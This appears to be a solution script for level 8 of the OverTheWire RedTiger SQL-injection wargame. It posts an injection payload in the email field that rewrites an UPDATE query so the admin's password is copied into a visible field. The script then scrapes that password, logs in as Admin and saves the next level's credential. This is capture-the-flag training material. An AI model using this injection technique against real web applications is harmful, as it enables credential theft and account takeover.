#!/usr/bin/env python3
import pickle
import tigers as tg
from bs4 import BeautifulSoup


def main():
    '''
    Target: Get the password of the admin.
    '''
    url = "https://redtiger.labs.overthewire.org/level8.php"
    finds = 'name'  # What we are finding
    pass_r = 'The password for the next level is: '

    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if 'level8login' not in cooks:
            print('use prevision level')
            exit(1)
    except:
        print('use level 1')
        exit(1)

    cook = dict(level8login=cooks['level8login'])

    # Payload
    data = dict(email="',name = password,email = '", edit="Edit")
    response = tg.get_request(url, data, cook, method='post')

    soup = BeautifulSoup(response, 'html.parser')
    passw = soup.find('input', {'name': 'name'})['value']

    # Authorization
    data = dict(user='Admin', password=passw, login='Login')
    response = tg.get_request(url, data, cook, method='post')

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)

    # Save cookie
    if ('level9login' not in cooks) or (cooks['level9login'] != passw):
        cooks['level9login'] = passw
        tg.save_cookies(cooks)


if __name__ == '__main__':
    main()
